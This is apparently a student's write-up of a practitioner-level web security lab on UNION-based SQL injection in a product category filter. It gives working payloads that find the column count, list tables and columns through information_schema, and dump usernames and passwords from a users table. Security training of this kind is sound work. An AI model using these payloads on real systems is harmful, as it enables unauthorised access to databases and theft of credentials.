# Lab 05 :  SQL injection attack, listing the database contents on non-Oracle databases

## Overview:
- Level : PRACTITIONER
- SQL Injection on product category filter
- Union attack
- End Goal : Determine the name of this table and the columns And  log in as the administrator user. 



## Analysis:
- put ' as product category it give 500 internal server error


## Solution:
- determine number of column
    ' UNION SELECT 'def'-- gives 500 internal server error
    ' UNION SELECT 'def','adfs'-- gives 200 ok responce
    so there are two column

- to get details about tables
    ' UNION SELECT table_name,NULL FROM information_schema.tables--

- users_cwlcoo table contains username and passwords

- to get columns name of users_cwlcoo table
    ' UNION SELECT column_name,NULL FROM information_schema.columns  WHERE table_name='users_cwlcoo'--

- columns
    username_gkoixc
    password_rlklus
    email

- get usernames and passwords
    ' UNION SELECT username_gkoixc,password_rlklus FROM users_cwlcoo--
